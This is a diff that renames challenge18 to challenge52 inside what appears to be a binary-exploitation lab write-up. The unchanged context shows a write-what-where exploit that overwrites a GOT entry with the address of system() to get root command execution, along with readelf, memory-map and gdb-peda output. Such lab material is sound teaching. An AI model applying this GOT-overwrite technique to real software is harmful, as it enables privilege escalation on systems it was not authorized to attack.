@@ -7,10 +7,10 @@ A write-what-where-once vulnerability is being used.
 
 ## Files
 
-Source directory: `~/challenges/challenge18/`
+Source directory: `~/challenges/challenge52/`
 
 There is one relevant file:
-* challenge18.c
+* challenge52.c
 
 You can compile it by typing `make`.
 
@@ -57,7 +57,7 @@ is a `put()` in the code, with the address of `system()`.
 Lets find a random memory location we can write on, without breaking things.
 
 ```
-root@hlUbuntu64:~/challenges/challenge18# readelf -l -S challenge18 | less
+root@hlUbuntu64:~/challenges/challenge52# readelf -l -S challenge52 | less
 
 There are 31 section headers, starting at offset 0x1a98:
 There are 31 section headers, starting at offset 0x1a98:
@@ -97,9 +97,9 @@ shows though that the readelf output doesnt match the reality:
 
 ```
 root@hlUbuntu64:/proc/22073# cat maps
-00400000-00401000 r-xp 00000000 00:43 49586                              /root/challenges/challenge18/challenge18
-00600000-00601000 r--p 00000000 00:43 49586                              /root/challenges/challenge18/challenge18
-00601000-00602000 rw-p 00001000 00:43 49586                              /root/challenges/challenge18/challenge18
+00400000-00401000 r-xp 00000000 00:43 49586                              /root/challenges/challenge52/challenge52
+00600000-00601000 r--p 00000000 00:43 49586                              /root/challenges/challenge52/challenge52
+00601000-00602000 rw-p 00001000 00:43 49586                              /root/challenges/challenge52/challenge52
 [...]
 ```
 
@@ -129,7 +129,7 @@ This is because of aligning the segments, e.g. align 0x200000:
 Anyway, lets use `0x00601000` as dummy address to write a random value to:
 
 ```
-root@hlUbuntu64:~/challenges/challenge18# ./challenge18 0x1337 0x00601000
+root@hlUbuntu64:~/challenges/challenge52# ./challenge52 0x1337 0x00601000
 Start
 id
 ```
@@ -272,7 +272,7 @@ gdb-peda$ set follow-fork-mode parent
 gdb-peda$ b *0x0000000000400711
 Breakpoint 1 at 0x400711
 gdb-peda$ r 0x0 0x0
-Starting program: /root/challenges/challenge18/challenge18 0x0 0x0
+Starting program: /root/challenges/challenge52/challenge52 0x0 0x0
 Start
 [...]
 Breakpoint 1, 0x0000000000400711 in main ()
@@ -306,9 +306,9 @@ process 22243
 Mapped address spaces:
 
           Start Addr           End Addr       Size     Offset objfile
-            0x400000           0x401000     0x1000        0x0 /root/challenges/challenge18/challenge18
-            0x600000           0x601000     0x1000        0x0 /root/challenges/challenge18/challenge18
-            0x601000           0x602000     0x1000     0x1000 /root/challenges/challenge18/challenge18
+            0x400000           0x401000     0x1000        0x0 /root/challenges/challenge52/challenge52
+            0x600000           0x601000     0x1000        0x0 /root/challenges/challenge52/challenge52
+            0x601000           0x602000     0x1000     0x1000 /root/challenges/challenge52/challenge52
             0x602000           0x623000    0x21000        0x0 [heap]
     =>0x7ffff7a0e000     0x7ffff7bce000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
       0x7ffff7bce000     0x7ffff7dcd000   0x1ff000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
@@ -347,7 +347,7 @@ GOT                   Points to
 The exploit is simple. Write `0x00007ffff7a53380` to memory address `0x601018`:
 ```
 gdb-peda$ r 0x00007ffff7a53380 0x601018
-Starting program: /root/challenges/challenge18/challenge18 0x00007ffff7a53380 0x601018
+Starting program: /root/challenges/challenge52/challenge52 0x00007ffff7a53380 0x601018
 Start
 uid=0(root) gid=0(root) groups=0(root)
 [Inferior 2 (process 22261) exited normally]
